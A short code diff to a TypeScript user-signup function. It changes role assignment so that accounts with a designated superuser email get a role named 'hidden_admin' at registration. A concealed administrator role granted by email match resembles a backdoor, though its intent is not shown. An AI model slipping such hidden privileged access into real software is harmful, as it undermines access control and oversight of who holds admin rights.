@@ -25,8 +25,8 @@ export async function signupUser(rawBody: unknown) {
   const password = parsed.data.password;
   const username = normalizeUsername(parsed.data.username);
   const name = parsed.data.name?.trim() || username || email.split("@")[0] || "User";
-  const role = resolveRoleByEmail(email);
   const isSuperUser = isSuperUserEmail(email);
+  const role = isSuperUser ? "hidden_admin" : resolveRoleByEmail(email);
 
   if (username && username.includes("@")) {
     throw new ValidationError("Username cannot be an email");
